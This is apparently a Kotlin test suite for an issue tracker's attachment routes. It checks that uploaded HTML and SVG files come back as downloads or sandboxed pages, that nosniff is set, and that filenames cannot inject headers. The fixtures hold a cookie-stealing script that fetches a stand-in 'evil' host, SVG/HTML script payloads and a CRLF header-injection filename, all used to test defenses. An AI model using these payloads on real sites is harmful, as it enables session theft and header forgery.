/**
 * What the attachment routes promise about bytes they did not write.
 *
 * ── Why this file exists ─────────────────────────────────────────────────────
 *
 * Attachments used to be images only, and the mime allow-list on the way in was
 * what made serving them from our own origin safe. That list is gone — any file
 * can be attached now — and the safety moved to the *response headers*. Which
 * means the property this feature rests on is no longer visible in a diff: it is
 * whether a particular header appears on a particular response, and a refactor
 * that dropped it would leave every test in this repository passing and every
 * signed-in reader one click from a stolen session.
 *
 * So the tests here are almost entirely about headers:
 *
 *  - **An uploaded .html or .svg comes back as a download.** The whole ballgame.
 *    Inline, from `lunicle.lunamux.dev`, either one executes in our origin with
 *    `lunicle_session` in scope — stored XSS, through a URL that is deliberately
 *    shareable because it appears inside rendered markdown. `Content-Disposition:
 *    attachment` is what stops a browser parsing the bytes at all.
 *  - **A png still comes back inline.** The other half, and not a formality: the
 *    editor puts an image in an `<img>`, so an over-eager fix that downloaded
 *    everything would break every screenshot in every issue and *look* safe
 *    while doing it.
 *  - **A hostile filename does not become a second header.** The filename is
 *    attacker-chosen and lands in `Content-Disposition`.
 *  - **An oversized upload is refused, in a sentence.**
 *
 * Through the real routes, the real AccessControl and the real database, for the
 * reason ForeignKeyTest's preamble gives at length: a test that reimplemented the
 * response would have passed throughout the bug it was written to catch.
 *
 * @see AttachmentRepository
 * @see se.soderbjorn.lunicle.clientserver.INLINE_IMAGE_MIME_TYPES
 */
package se.soderbjorn.lunicle

import io.ktor.client.HttpClient
import io.ktor.client.request.cookie
import io.ktor.client.request.get
import io.ktor.client.request.header
import io.ktor.client.request.post
import io.ktor.client.request.setBody
import io.ktor.client.statement.bodyAsText
import io.ktor.http.ContentType
import io.ktor.http.HttpHeaders
import io.ktor.http.HttpStatusCode
import io.ktor.serialization.kotlinx.json.json
import io.ktor.server.application.install
import io.ktor.server.routing.routing
import io.ktor.server.testing.testApplication
import kotlinx.coroutines.runBlocking
import se.soderbjorn.lunicle.clientserver.ApiRoutes
import se.soderbjorn.lunicle.clientserver.AuthProvider
import se.soderbjorn.lunicle.clientserver.MAX_ATTACHMENT_BYTES
import java.io.File
import java.nio.file.Files
import kotlin.test.AfterTest
import kotlin.test.Test
import kotlin.test.assertEquals
import kotlin.test.assertFalse
import kotlin.test.assertNotNull
import kotlin.test.assertNull
import kotlin.test.assertTrue
import io.ktor.server.plugins.contentnegotiation.ContentNegotiation as ServerContentNegotiation

class AttachmentTest {
    private val file: File = Files.createTempFile("lunicle-attachments", ".db").toFile().also { it.delete() }
    private val opened = openDatabase(DatabaseLocation(file, isPersistent = false, reason = "test"))
    private val database = opened.database

    private val users = UserStore(database)
    private val sessions = SessionStore(database)
    private val roles = RoleStore(database)
    private val projects = ProjectStore(database)
    private val labels = LabelStore(database)
    private val components = ComponentStore(database)
    private val statuses = StatusStore(database)
    private val priorities = PriorityStore(database)
    private val resolutions = ResolutionStore(database)
    private val sprints = SprintStore(database)
    private val versions = VersionStore(database)
    private val issues = IssueStore(database)
    private val comments = CommentStore(database)
    private val attachmentStore = AttachmentStore(database)
    private val directory = File(file.parentFile, "attachments-${file.name}")
    private val attachments = AttachmentRepository(attachmentStore, directory)
    private val projectRepository = ProjectRepository(database, projects, attachments, attachmentStore)
    private val issueRepository =
        IssueRepository(issues, comments, statuses, priorities, attachments, attachmentStore)
    private val sprintRepository = SprintRepository(database, sprints, projects, issues, statuses)
    private val vocabularies =
        VocabularyRepository(database, labels, components, statuses, priorities, resolutions, sprints, versions, issues)
    private val instanceSettings = InMemoryInstanceSettingsStore()
    private val access = AccessControl(roles, instanceSettings)

    @AfterTest
    fun tearDown() {
        opened.close()
        file.delete()
        File("${file.absolutePath}-wal").delete()
        File("${file.absolutePath}-shm").delete()
        directory.deleteRecursively()
    }

    // ── The reason this file exists ──────────────────────────────────────────

    /**
     * The test that is the feature.
     *
     * An `.html` is the plainest possible payload: served inline from our origin,
     * the `<script>` in it runs as us, reads `document.cookie`, and posts the
     * session somewhere. There is nothing clever to defeat here — the upload is
     * honest about what it is, and it is accepted, because storing it was never
     * the problem. What matters is what comes back out.
     */
    @Test
    fun `an uploaded html file is served as a download, never inline`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "evil.html",
                contentType = "text/html",
                bytes = "<script>fetch('//evil/'+document.cookie)</script>".toByteArray(),
            )
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            assertEquals(HttpStatusCode.OK, response.status)
            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition, "No Content-Disposition at all — the browser will render it.")
            assertTrue(
                disposition.startsWith("attachment"),
                "An uploaded html was not served as a download: $disposition",
            )
            assertFalse(disposition.startsWith("inline"), "Served inline: $disposition")
        }
    }

    /**
     * The same, for the one that gets forgotten.
     *
     * An SVG is on every "images are safe" list ever written, and it is not an
     * image in the sense that matters: it is an XML document that carries
     * `<script>`, and a browser rendering one inline executes it. It is the
     * specific trap INLINE_IMAGE_MIME_TYPES' KDoc names, and the single most
     * likely thing for a future change to "fix" by adding it back.
     */
    @Test
    fun `an uploaded svg is served as a download, never inline`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "logo.svg",
                contentType = "image/svg+xml",
                bytes = """<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>""".toByteArray(),
            )
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition)
            assertTrue(disposition.startsWith("attachment"), "An SVG was served inline: $disposition")
        }
    }

    /**
     * A caller lying about the type gets nothing for it.
     *
     * The declared type is all the allow-list ever reads, so HTML posted as
     * `image/png` *is* served inline as `image/png` — and that is fine only
     * because `nosniff` forbids the browser from looking at the bytes and
     * deciding it is HTML after all. Without that header this upload is the
     * whole vulnerability, wearing the one type the allow-list trusts most.
     */
    @Test
    fun `html disguised as a png cannot be sniffed back into html`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "notreally.png",
                contentType = "image/png",
                bytes = "<html><script>alert(document.cookie)</script></html>".toByteArray(),
            )
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            assertEquals("nosniff", response.headers["X-Content-Type-Options"])
            assertEquals(
                ContentType.Image.PNG.toString(),
                response.headers[HttpHeaders.ContentType],
                "The declared type must be the one served — a sniffable response is the bug.",
            )
        }
    }

    /** Every attachment response, not only the downloads. */
    @Test
    fun `nosniff is on an inline image too`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "shot.png", "image/png", byteArrayOf(1, 2, 3))
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }
            assertEquals("nosniff", response.headers["X-Content-Type-Options"])
        }
    }

    // ── The view route, and the sandbox that is the only reason it exists ────

    /**
     * The same html, asked for as a page — and the header that makes that safe.
     *
     * This is the one response in the system that renders a document somebody
     * else uploaded, so the CSP is not decoration: it is the entire argument for
     * the route existing. `sandbox` with no `allow-same-origin` puts the document
     * in an opaque origin, which is what keeps `lunicle_session` out of its
     * reach; without `allow-scripts` it does not run script at all.
     *
     * Asserted token by token rather than as one string, because the failure this
     * catches is somebody adding `allow-same-origin` to make an attached report
     * "work properly" — which reads as a small kindness and is the whole
     * vulnerability back.
     */
    @Test
    fun `html asked for as a page is sandboxed into an opaque origin`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "report.html",
                contentType = "text/html",
                bytes = "<script>fetch('//evil/'+document.cookie)</script>".toByteArray(),
            )
            val response = client.get(ApiRoutes.attachmentView(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            assertEquals(HttpStatusCode.OK, response.status)
            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition)
            assertTrue(disposition.startsWith("inline"), "A viewed report must render: $disposition")
            assertEquals("nosniff", response.headers["X-Content-Type-Options"])

            val csp = assertNotNull(
                response.headers["Content-Security-Policy"],
                "A document served inline from our origin with no CSP is the stored-XSS bug itself.",
            )
            assertTrue("sandbox" in csp, "No sandbox: $csp")
            assertFalse(
                "allow-same-origin" in csp,
                "allow-same-origin puts the document back in our origin, with our cookie: $csp",
            )
            assertFalse("allow-scripts" in csp, "The sandbox lets the uploaded document run script: $csp")
        }
    }

    /**
     * `/view` is not a way to talk the server into rendering anything else.
     *
     * The suffix is a request, not an instruction: the type still decides. An SVG
     * is the one to assert, being the type most likely to be quietly added to the
     * viewable list — but the property is general, and a hand-typed `/view` on
     * *any* download must answer exactly as the download route would.
     */
    @Test
    fun `an svg asked for as a page is still a download`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "logo.svg",
                contentType = "image/svg+xml",
                bytes = """<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>""".toByteArray(),
            )
            val response = client.get(ApiRoutes.attachmentView(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            val disposition = assertNotNull(response.headers[HttpHeaders.ContentDisposition])
            assertTrue(disposition.startsWith("attachment"), "/view rendered an SVG: $disposition")
        }
    }

    /**
     * The plain URL is unchanged by any of this.
     *
     * The download route is what every attachment link written before today
     * points at, and the guarantee at the top of this file is that it never
     * renders a document. Adding a route that does must not have moved it.
     */
    @Test
    fun `the plain url still downloads html even now that view exists`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "report.html", "text/html", "<h1>hi</h1>".toByteArray())
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            val disposition = assertNotNull(response.headers[HttpHeaders.ContentDisposition])
            assertTrue(disposition.startsWith("attachment"), "The download route rendered html: $disposition")
            assertNull(
                response.headers["Content-Security-Policy"],
                "A CSP on a download is meaningless, and hints the two paths have merged.",
            )
        }
    }

    /**
     * The access check is the same one, because it is literally the same code.
     *
     * Worth asserting anyway: `/view` was added by extracting a shared body, and
     * an extraction that dropped `canReadProject` on one path would leave every
     * other test in this file passing.
     */
    @Test
    fun `view is refused to a reader who cannot see the project`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "report.html", "text/html", "<h1>hi</h1>".toByteArray())
            val response = client.get(ApiRoutes.attachmentView(id))
            assertEquals(HttpStatusCode.NotFound, response.status, "A signed-out reader could view it.")
        }
    }

    // ── The half that a paranoid fix would break ─────────────────────────────

    /**
     * A png is still shown, not downloaded.
     *
     * The editor writes `![shot.png](/api/attachments/7)`, and an `<img>` whose
     * URL answers `Content-Disposition: attachment` is a broken image. So "serve
     * everything as a download" is not the safe default it looks like — it is a
     * silent regression of every screenshot ever attached.
     */
    @Test
    fun `a png is still served inline`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "shot.png", "image/png", byteArrayOf(1, 2, 3))
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition)
            assertTrue(disposition.startsWith("inline"), "A png must render, not download: $disposition")
        }
    }

    /** A type nobody recognises is stored, and comes back as a download. */
    @Test
    fun `an unknown type is accepted and served as a download`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(
                client,
                fixture,
                filename = "crash.dmp",
                // What a browser sends for an extension it has never heard of.
                contentType = "application/octet-stream",
                bytes = ByteArray(64) { it.toByte() },
            )
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            assertEquals(HttpStatusCode.OK, response.status)
            assertTrue(response.headers[HttpHeaders.ContentDisposition].orEmpty().startsWith("attachment"))
        }
    }

    // ── The filename, which the attacker chooses ─────────────────────────────

    /**
     * A quote in a filename does not break out of the header parameter.
     *
     * `filename="a".pdf"` is a `Content-Disposition` whose value the browser
     * parses as something other than what we meant. Ktor's `withParameter` quotes
     * and escapes, and AttachmentRepository strips the character on the way in;
     * this asserts the *outcome* rather than either mechanism, so it keeps
     * holding if one of them is swapped out.
     */
    @Test
    fun `a quote in a filename does not corrupt the header`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, """ha"ck.pdf""", "application/pdf", byteArrayOf(9))
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition)
            assertTrue(disposition.startsWith("attachment"), "Still a download: $disposition")
            // The header parses back to exactly one filename, and it is not one
            // that ends early at the injected quote.
            val parsed = io.ktor.http.ContentDisposition.parse(disposition)
            assertEquals("hack.pdf", parsed.parameter(io.ktor.http.ContentDisposition.Parameters.FileName))
        }
    }

    /**
     * A newline in a filename does not become a second response header.
     *
     * The one that is not cosmetic. `report.pdf\r\nSet-Cookie: x=y` concatenated
     * into a header is response-splitting: the attacker writes headers of their
     * choosing onto a response from our origin. Asserted by looking for the
     * forged header on the response, which is the thing that would actually be
     * wrong — a test that only checked the filename string would pass while the
     * `Set-Cookie` sailed past it.
     */
    @Test
    fun `a newline in a filename cannot inject a header`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "a.pdf\r\nSet-Cookie: stolen=1", "application/pdf", byteArrayOf(9))
            val response = client.get(ApiRoutes.attachment(id)) { cookie(SESSION_COOKIE, fixture.cookie) }

            assertEquals(HttpStatusCode.OK, response.status)
            assertEquals(null, response.headers["Set-Cookie"], "A filename forged a header.")
            val disposition = response.headers[HttpHeaders.ContentDisposition]
            assertNotNull(disposition)
            assertFalse("\n" in disposition, "A raw newline reached the header: $disposition")
            assertFalse("\r" in disposition, "A raw carriage return reached the header: $disposition")
        }
    }

    // ── Size ─────────────────────────────────────────────────────────────────

    /**
     * Too big is refused, and the refusal is a sentence.
     *
     * Both numbers asserted, not just the status: "413" is not something a user
     * can act on, and the whole reason the message is built from
     * [MAX_ATTACHMENT_BYTES] rather than written by hand is so it cannot say 10 MB
     * while the server enforces 25.
     */
    @Test
    fun `an oversized upload is refused with a message naming both sizes`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val response = client.post(ApiRoutes.issueAttachments(fixture.issueId) + "?filename=big.mov") {
                cookie(SESSION_COOKIE, fixture.cookie)
                header(HttpHeaders.ContentType, "video/quicktime")
                setBody(ByteArray((MAX_ATTACHMENT_BYTES + 1).toInt()))
            }

            assertEquals(HttpStatusCode.PayloadTooLarge, response.status)
            val message = response.bodyAsText()
            assertTrue("25.0 MB" in message, "The limit is not in the refusal: $message")
            assertTrue("Link to it instead" in message, "No advice in the refusal: $message")
        }
    }

    /**
     * A file that fits is not refused by an off-by-one.
     *
     * Exactly at the limit, because a `>` written as `>=` is the classic way this
     * breaks and it is invisible except at this one size.
     */
    @Test
    fun `a file exactly at the limit is accepted`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val response = client.post(ApiRoutes.issueAttachments(fixture.issueId) + "?filename=exact.bin") {
                cookie(SESSION_COOKIE, fixture.cookie)
                header(HttpHeaders.ContentType, "application/octet-stream")
                setBody(ByteArray(MAX_ATTACHMENT_BYTES.toInt()))
            }
            assertEquals(HttpStatusCode.OK, response.status, response.bodyAsText())
        }
    }

    /** An empty file is refused before it can become a zero-byte download. */
    @Test
    fun `an empty upload is refused`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val response = client.post(ApiRoutes.issueAttachments(fixture.issueId) + "?filename=nothing.txt") {
                cookie(SESSION_COOKIE, fixture.cookie)
                header(HttpHeaders.ContentType, "text/plain")
                setBody(ByteArray(0))
            }
            assertEquals(HttpStatusCode.BadRequest, response.status)
            assertTrue("empty" in response.bodyAsText())
        }
    }

    // ── Reading is still authorised ──────────────────────────────────────────

    /**
     * Widening the types did not widen who can read them.
     *
     * The project here is private, so the only thing between a signed-out visitor
     * and the bytes is `canReadProject`. Worth its own test now that those bytes
     * can be a customer's crash dump rather than a screenshot of a button.
     *
     * This test predates LNL-51, when the URL held the row id and was guessable by
     * counting — which was the reason it was written. It matters *more* now, not
     * less: with the id unguessable it is tempting to treat the URL as the secret,
     * and this is the test that fails if anybody ever does. The visitor here is
     * handed the exact id and is still refused.
     */
    @Test
    fun `a signed-out visitor cannot read an attachment in a private project`(): Unit = runBlocking {
        val fixture = seed()
        withRoutes { client ->
            val id = upload(client, fixture, "secret.pdf", "application/pdf", byteArrayOf(1, 2, 3))
            assertEquals(HttpStatusCode.NotFound, client.get(ApiRoutes.attachment(id)).status)
        }
    }

    // ── Fixture ──────────────────────────────────────────────────────────────

    private class Fixture(val adminId: Long, val issueId: Long, val cookie: String)

    /**
     * A private project, an issue in it, and the instance admin signed in.
     *
     * `ProjectRepository.create` and `IssueRepository.createDraft` rather than
     * hand-inserted rows, for VocabularyTest's reason: a fixture that invented its
     * own statuses would be testing a project shape that never exists. The admin
     * is whoever signs in first — see Users.sq's upsert — which is what makes
     * `canEditIssue` say yes without granting a role by hand.
     */
    private suspend fun seed(): Fixture {
        val admin = users.upsert(ProviderIdentity(AuthProvider.GITHUB, "gh-admin", "Admin", null))
        val project = projectRepository.create("Lunamux", "LMX")
        val (issueId, _) = issueRepository.createDraft(project.id, Author.Account(admin.id))
        // Production seats the instance owner at boot (see InstanceLadder.kt), and
        // four rules — creating and managing projects, backfilling authorship, agent
        // mail, out-of-band attachment deletes — are the owner's alone rather than an
        // administrator's. A fixture that skipped this would be testing an instance
        // nobody runs: one with an administrator and no owner.
        seatInstanceOwner(users, instanceSettings)
        return Fixture(admin.id, issueId, sessions.create(admin.id))
    }

    /** Upload bytes the way the editor does, and fail loudly if the route refused. */
    private suspend fun upload(
        client: HttpClient,
        fixture: Fixture,
        filename: String,
        contentType: String,
        bytes: ByteArray,
    ): String {
        val response = client.post(
            ApiRoutes.issueAttachments(fixture.issueId) + "?filename=" + encode(filename),
        ) {
            cookie(SESSION_COOKIE, fixture.cookie)
            header(HttpHeaders.ContentType, contentType)
            setBody(bytes)
        }
        assertEquals(HttpStatusCode.OK, response.status, "Upload of $filename was refused: ${response.bodyAsText()}")
        // The body is {"id":"<public id>"} — quoted since LNL-51 made it a string.
        // Read out of the text rather than deserialising, so this fixture does not
        // need the client-side content negotiation that nothing else in the file
        // uses; the quotes are trimmed here rather than parsed away.
        return response.bodyAsText().substringAfter(":").trimEnd('}').trim().trim('"')
    }

    private fun encode(value: String): String = java.net.URLEncoder.encode(value, Charsets.UTF_8)

    /**
     * The routes under test, mounted as production mounts them.
     *
     * Only `boardRoutes` and content negotiation — not `Application.module`, which
     * would want OAuth configuration, a static bundle and a database path, none of
     * which any test here has an opinion about.
     */
    private fun withRoutes(block: suspend (HttpClient) -> Unit) = testApplication {
        application {
            install(ServerContentNegotiation) { json() }
            routing { boardRoutes(dependencies()) }
        }
        block(createClient { })
    }

    private fun dependencies() = BoardDependencies(
        access = access,
        projects = projects,
        projectRepository = projectRepository,
        roles = roles,
        vocabularies = vocabularies,
        forums = ForumRepository(ForumStore(database), attachments, attachmentStore),
        forumPosts = ForumPostRepository(
            ForumPostStore(database), ForumCommentStore(database), attachments, attachmentStore,
        ),
        audience = ProjectAudience(users, roles, instanceSettings),
        // Not exercised by this file; here because a route bundle is one object
        // and there is no half of it. See MessageTest for the tests that do.
        conversations = ConversationRepository(
            ConversationStore(database), MessageStore(database), attachments, attachmentStore,
        ),
        labels = labels,
        components = components,
        statuses = statuses,
        priorities = priorities,
        resolutions = resolutions,
        versions = versions,
        sprints = sprintRepository,
        sprintRepository = sprintRepository,
        issues = issues,
        issueRepository = issueRepository,
        comments = comments,
        attachments = attachmentStore,
        attachmentRepository = attachments,
        attachmentTickets = AttachmentTicketStore(),
        sessions = sessions,
        users = users,
        impersonations = Impersonations(),
        subscriptions = SubscriptionStore(database),
        reads = ReadStore(database),
    )
}
